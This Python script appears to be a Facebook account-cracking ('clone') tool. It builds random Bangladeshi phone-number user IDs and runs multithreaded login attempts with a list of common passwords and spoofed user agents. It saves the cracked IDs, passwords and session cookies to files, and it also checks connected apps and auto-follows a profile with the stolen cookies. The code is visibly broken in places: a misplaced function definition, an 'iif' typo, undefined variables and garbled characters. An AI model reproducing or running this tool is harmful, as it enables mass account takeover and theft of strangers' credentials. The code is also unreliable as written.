
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system("clear")
print(" \033[92;1m[MRX JIBON] JOIN MY FACEBOOK GROUP + FOLLOW MY FB ID ")
os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL')
os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share')
logo = ("""
\x1b[1;96m      ╭━╮╭━┳━━━┳━╮╭━╮╱╱╱╱╭┳━━┳━━╮╭━━━┳━╮╱╭╮
\x1b[1;96m      ┃┃╰╯┃┃╭━╮┣╮╰╯╭╯╱╱╱╱┃┣┫┣┫╭╮┃┃╭━╮┃┃╰╮┃┃
\x1b[1;96m      ┃╭╮╭╮┃╰━╯┃╰╮╭╯╱╱╱╱╱┃┃┃┃┃╰╯╰┫┃╱┃┃╭╮╰╯┃
\x1b[1;96m      ┃┃┃┃┃┃╭╮╭╯╭╯╰╮╱╱╱╭╮┃┃┃┃┃╭━╮┃┃╱┃┃┃╰╮┃┃
\x1b[1;96m      ┃┃┃┃┃┃┃┃╰┳╯╭╮╰╮╭╮┃╰╯┣┫┣┫╰━╯┃╰━╯┃┃╱┃┃┃
\x1b[1;96m      ╰╯╰╯╰┻╯╰━┻━╯╰━╯╰┫╰━━┻━━┻━━━┻━━━┻╯╱╰━╯
\x1b[1;96m      ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╯        
  \x1b[1;96m--------------------------------------------------
  [~] AUTHOR   : JIBON SARKER
  [~] FACEBOOK : MD JIBON ISLAM
  [~] FACEBOOK : JIBON SARKAR
  [~] TOOL     : BD RANDOM + \033[1;97m\033[1;45mSTARTED PROCESS 5 MIN\033[1;0m\033[1;97m\033[38;5;46m
  [~] VERSION  : \033[1;97m\033[1;45m0.46\033[1;0m\033[1;97m\033[38;5;46m + \033[1;97m\033[1;45mFAST CLONE\033[1;0m\033[1;97m\033[38;5;46m
  \x1b[1;96m----------------------------------------------""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :shanto = '√ 2009'
        elif uid[:8] in ['10000000']        :shanto = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
        elif uid[:6] in ['100001']          :shanto = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :shanto = '√ 2011/2012'
        elif uid[:6] in ['100004']          :shanto = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :shanto = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :shanto = '√ 2014/2015'
        elif uid[:6] in ['100009']          :shanto = '√ 2015'
        elif uid[:5] in ['10001']           :shanto = '√ 2015/2016'
        elif uid[:5] in ['10002']           :shanto = '√ 2016/2017'
        elif uid[:5] in ['10003']           :shanto = '√ 2018/2019'
        elif uid[:5] in ['10004']           :shanto = '√ 2019/2020'
        elif uid[:5] in ['10005']           :shanto = '√ 2020'
        elif uid[:5] in ['10006','10007','']:shanto = '√ 2021'
        elif uid[:5] in ['10008']           :shanto = '√ 2022'
        elif uid[:5] in ['10009']           :shanto = '√ 2023'
        else:shanto=''
    elif len(uid) in [9,10]:
        shanto = ' √ 2008/2009'
    elif len(uid)==8:
        shanto = '√ 2007/2008'
    elif len(uid)==7:
        shanto = '√ 2006/2007'
    else:shanto=''
    return shanto
    
    
    
# APK CHECK
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.twf = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("  [01] \033[1;97m\033[1;45mBD RANDOM UID CLONE\033[1;0m\033[1;97m\033[38;5;46m")
        print("  [02] RANDOM EMAIL CLONE ")
        print("  [00] EXIT")
        Mumit =input("  \033[1;97m[??] CHOOSE : ")
        os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print('  [+] \033[1;97m\033[1;45mBD SIM CODES : 017.018.019.016.013.014\033[1;0m\033[1;97m\033[38;5;46m ')
    kode = input('  [?] ENTER SIM CODE: ')
    os.system('xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('  [+] \033[1;97m\033[1;45mEXAMPLE : 5000 / 10000 / 50000\033[1;0m\033[1;97m\033[38;5;46m ')
    limit = int(input('  \033[1;97m[?] CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ip = requests.get("https://api.ipify.org").text
       # jalan("  [+]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)
        print(' \033[33;1m [+] TOTAL IDS:\033[38;5;45m '+tl)
        print(' \033[33;1m [+] PROCESS HAS BEEN STARTED')
        print(' \033[33;1m [!] WAIT FOR IDS ')
        print(' \033[33;1m [!] USE FLIGHT MODE FOR SPEED UP ')
        print("  \x1b[1;96m--------------------------------------------------")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'BANGLADESH','Bangladesh','bangladesh','Free fire','free fire','I Love You','I love you','i love you','123@@@','@@@###','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya','Ramjan','Md Jahidul Islam','Jahidul','Shakil','Badsha','Tanjila','Rashel','Mohammad','113355','22334455','121235','1234567890']
            yaari.submit(rcrack1,uid,pwx,tl)
    print('  [+] Crack process has been completed')
    print('  [+] Ids saved in ok.txt,cp.txt')
    def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global twf
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r [\033[38;5;46mJIBON-XD\033[1;97m] [\033[38;5;45m%s\033[0m/%s | OK\033[1;97m:-\033[38;5;46m%s\033[1;97m | CP\033[1;97m:-\033[38;5;196m%s\033[1;97m | 2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'p.facebook.com',
            "method": 'POST',
            "scheme": 'https',
            "accept": 'application/x-www-form-urlencoded',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://p.facebook.com/',
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'empty',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            iif 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = "1000"+coki1[0:11]
                print(f'\r\33[1;92m [JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
              #  print(f'\r\33[35;1m [COOKIES] '+coki)
           #     cek_apk(session,coki)                
                open('/sdcard/JIBON-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idf = coki[82:97]
                print(f"\33[1;91m[JIBON-CP] {uid} | {ps}")
                open('/sdcard/JIBON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[Ã°ÂÂâ€œÃ°ÂÂâ‚¬Ã°ÂÂâ€™Ã°ÂÂË†Ã°ÂÂÂ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}Ã°ÂÂâ€œÃ°ÂÂâ‚¬Ã°ÂÂâ€™Ã°ÂÂË†Ã°ÂÂÂ{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â{P}[{H}{ok}{P}]ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â{P}[{k}{cp}{x}]ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
        
Main()